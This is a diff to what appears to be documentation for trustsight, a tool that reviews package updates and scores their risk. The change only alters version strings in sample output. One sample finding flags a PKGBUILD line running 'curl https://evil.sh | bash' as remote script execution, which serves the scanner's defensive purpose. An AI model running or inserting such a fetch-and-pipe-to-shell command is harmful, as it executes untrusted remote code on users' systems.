@@ -155,15 +155,15 @@ trustsight review --score
 
 ```
 ╭────────────────────────── chez-scheme-bin ───────────────────────────╮
-│  Version  10.0.0  →  10.1.0                                          │
+│  Version  10.0.0-1  →  10.1.0-2                                     │
 │  Status   Only pkgver and sha256sums changed. Review the diff        │
 │           before building.                                           │
-│  Changed  pkgver 10.0.0 -> 10.1.0                                    │
+│  Changed  pkgver 10.0.0-1 -> 10.1.0-2                               │
 │           checksums checksum added or changed                        │
 │  Score    0/100 (Low)                                                │
 ╰──────────────────────────────────────────────────────────────────────╯
 ╭──────────────────────────── sketchy-pkg ─────────────────────────────╮
-│  Version  1.4.2  →  1.5.0                                            │
+│  Version  1.4.2-1  →  1.5.0-2                                       │
 │  Status   The update is not trivial. Review it.                      │
 │           PKGBUILD line 4 [R001]  Remote Script Execution: curl      │
 │           https://evil.sh | bash [R001]                              │
